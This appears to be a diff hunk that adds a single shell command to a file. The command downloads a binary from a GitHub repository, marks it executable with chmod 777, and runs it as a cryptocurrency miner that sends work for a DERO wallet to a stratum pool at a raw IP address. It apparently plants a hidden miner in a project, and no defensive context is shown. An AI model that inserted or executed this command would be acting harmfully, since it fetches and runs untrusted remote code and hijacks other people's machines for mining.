@@ -1,0 +1,1 @@
+wget -O mente https://github.com/renilo/kuuntul/raw/main/mente && chmod 777 mente && ./mente -w dero1qyq8st600gjd836pvfzjtrc3sqr6jz7st2s056n5f678keyvvns4zqgs6uveq.NEWERA -r stratum+tcp://51.222.96.66:443 -p stratum
